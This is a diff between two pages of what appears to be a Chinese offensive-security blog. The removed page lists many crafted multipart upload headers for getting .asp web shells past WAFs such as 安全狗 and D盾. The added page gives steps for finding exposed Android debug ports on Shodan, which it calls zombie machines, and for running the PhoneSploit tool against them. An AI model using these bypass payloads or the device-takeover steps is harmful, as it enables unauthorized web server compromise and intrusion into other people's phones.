@@ -26,7 +26,7 @@
 
   
 
-  <title>常规WAF上传绕过 | 黑辰&#39;by</title>
+  <title>入侵安卓 | 黑辰&#39;by</title>
 
   
 
@@ -100,20 +100,20 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">常规WAF上传绕过</h1>
+          <h1 class="title-wrap">入侵安卓</h1>
           <h2 class="title-sub-wrap">
             <strong>ANQUSEC</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2021-10-13T09:40:11.000Z" itemprop="datePublished">2021-10-13</time>
+            <time  class="article-date" datetime="2021-10-13T09:52:45.000Z" itemprop="datePublished">2021-10-13</time>
           </h2>
           <ul class="wrap-list dark">
   
-    <li><a href="/categories/%E9%98%B2%E7%81%AB%E5%A2%99/">📒 防火墙</a></li>
+    <li><a href="/categories/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F/">📒 安卓渗透</a></li>
   
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/WAF%E7%BB%95%E8%BF%87/">🏷️ WAF绕过</a></li>
+    <li><a href="/tags/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F/">🏷️ 安卓渗透</a></li>
   
 </ul>
         </div>
@@ -137,138 +137,32 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p>默认状态</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破0</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”[0x09]a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破1 去掉双引号</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=a.asp</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破2 添加一个filename1</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”;filename1=”test.jpg”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破3 form中间+</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: f+orm-data; name=”filepath”;filename=”test.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破4 大小写</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破5 去掉form-data</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破6 在Content-Disposition:后添加多个空格 或者在form-data;后添加多个空格</p>
-<p>[mw_shl_code=bash,true][mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code][/mw_shl_code]</p>
-<p>突破7 a.asp . (空格+.)</p>
-<p>[mw_shl_code=bash,true][mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”a.asp .”</p>
-<p>Content-Type: text/html[/mw_shl_code][/mw_shl_code]</p>
-<p>突破8 “换行</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”a.asp</p>
-<p>“</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破9 NTFS流</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”test.asp::$DATA”</p>
-<p>Content-Type: text/html</p>
-<p>——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”test.asp::$DATA\0x00\fuck.asp0x00.jpg”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破10 经过对IIS 6.0的测试发现，其总是采用第一个Content-Disposition中的值做为接收参数，而安全狗总是以最后一个Content-Disposition中的值做为接收参数。因此尝试构造如下请求[上传test.asp成功]：</p>
-<p>[mw_shl_code=bash,true]Content-Disposition: form-data; name=”FileUploadName”; filename=”test.asp”</p>
-<p>—————————–15377259221471</p>
-<p>Content-Disposition: form-data; name=”FileUploadName”; filename=”test.txt”</p>
-<p>Content-Type: application/octet-stream</p>
-<p>Content-Disposition: form-data; name=”FileUploadName”; filename=”test.asp”</p>
-<p>Content-Disposition: form-data;</p>
-<p>name=”FileUploadName”; filename=”test.asp”[/mw_shl_code]</p>
-<p>突破11 换位</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Type: text/html</p>
-<p>ConTent-Disposition: form-data; name=”filepath”; filename=”a.asp”[/mw_shl_code]</p>
-<p>​    在上述的方法中，还有些方法可以过安全狗，也可以过D盾、360网站卫士等等。另外从上述方法中，若按你们的想法，会分成那些类型？我在这里统一划分为特性和WAF解析不当(PS下，我不是学术派，较口语化)i，特性包括系统特性，协议特性等等，比如上述中，大多数都属于协议的特性，因为FORM-DATA的协议十分松散；部分属于系统特性，比如加空格、点号、NTFS流等等。而解析不当，比如上述的第二种添加一个filename1，这种在正常情况下无法使用的，如果第0种，对特殊字符无法解析，归根到底也是WAF对内容解析的不当处理。</p>
-<p>​    针对于特性，在上传这一块，好像能用到的就只有系统特性和协议特性，系统特性从系统出现到现在才挖掘出那么一点点，对于我等菜鸟而言，就更难挖掘了。于是我们就把目光放到协议上。</p>
-<p>默认状态</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>上述方法我们已经开始测试，那么，有没有想过。既然你们想得到用window特性来+空格，有没有想过用协议来+-空格</p>
-<p>突破方法001</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition:form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法002</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法003</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type:text/html[/mw_shl_code]</p>
-<p>突破方法004</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename= “a.asp”</p>
-<p>Content-Type:text/html[/mw_shl_code]</p>
-<p>突破方法005</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>上述就5种方法了，然后呢，空格可以，谁可以代替空格，tab？咱们来试试</p>
-<p>突破方法006</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition:   form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法007</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data;   name=”uploaded”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法008</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=  “a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>上面的方法可以延伸很多种了，记住一点，什么可以替换空格！</p>
-<p>接下来，我们在根据之前公布的方法 ，大小写</p>
-<p>突破方法009</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法010</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: Form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法011</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; Name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法012</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; Filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法013</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-type: text/html[/mw_shl_code]</p>
-<p>然后，这里在针对一个漏洞结合下，记得form-data中见存在一个+号吗，为什么不能放到前面或者后面</p>
-<p>突破方法014</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: +form-data; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p>突破方法015</p>
-<p>[mw_shl_code=bash,true]——WebKitFormBoundary2smpsxFB3D0KbA7D</p>
-<p>Content-Disposition: form-data+; name=”filepath”; filename=”a.asp”</p>
-<p>Content-Type: text/html[/mw_shl_code]</p>
-<p><img src="/2021/10/13/wafdk/183226-16260859463ec7.jpg"></p>
+        <p>公网寻找安卓肉鸡</p>
+<p><a target="_blank" rel="noopener" href="https://www.shodan.io/search?query=android+debug+bridge+product:%E2%80%9CAndroid+Debug+Bridge%E2%80%9D">https://www.shodan.io/search?query=android+debug+bridge+product%3A“Android+Debug+Bridge”</a></p>
+<p>python</p>
+<p>curl -O <a target="_blank" rel="noopener" href="https://bootstrap.pypa.io/get-pip.py">https://bootstrap.pypa.io/get-pip.py</a></p>
+<p>centos7.6安装adb</p>
+<p>yum -y install wget unzip zip</p>
+<p>安装配置SDK</p>
+<p>cd /opt &amp;&amp; mkdir androidSdk &amp;&amp; wget <a target="_blank" rel="noopener" href="https://dl.google.com/android/repository/sdk-tools-linux-3859397.zip">https://dl.google.com/android/repository/sdk-tools-linux-3859397.zip</a> &amp;&amp; unzip sdk-tools-linux-3859397.zip</p>
+<p>配置命令</p>
+<p>echo ‘export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL’ &gt; /etc/profile.d/android.sh</p>
+<p>echo ‘export PATH=$PATH:/opt/androidSdk/tools/bin’ &gt;&gt; /etc/profile.d/android.sh</p>
+<p>source /etc/profile.d/android.sh</p>
+<p>adb 32 64位问题</p>
+<p>yum install ncurses ncurses-devel ncurses-libs ncurses-libs.i686 ncurses-devel.i686</p>
+<p>linux</p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/Zucccs/PhoneSploit">https://github.com/Zucccs/PhoneSploit</a></p>
+<p>cd PhoneSploit</p>
+<p>pip install colorama</p>
+<p>python2 main_linux.py</p>
+<p>windox（cmd）</p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/Zucccs/PhoneSploit">https://github.com/Zucccs/PhoneSploit</a></p>
+<p>extract adb.rar to the phonesploit directory </p>
+<p>cd PhoneSploit</p>
+<p>pip install colorama</p>
+<p>python2 main.py</p>
+<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fcms-bucket.nosdn.127.net%2Fcatchpic%2F5%2F5b%2F5b4a5146a4389c400529380897f64ef2.jpg%3FimageView%26thumbnail%3D550x0&refer=http%3A%2F%2Fcms-bucket.nosdn.127.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1636710725&t=2a7ca5fa101715c915681bff67b566fe"></p>
 
       </section>
 
@@ -276,28 +170,14 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-    <div class="card-text">
-      
-        <a href="/2021/10/13/anz/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">入侵安卓</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2021/10/13/shell-hq/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">国外范围性shell获取</h2>
+        <a href="/2021/10/13/wafdk/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">常规WAF上传绕过</h2>
         </a>
       
       <div class="card-text--row">Older</div>
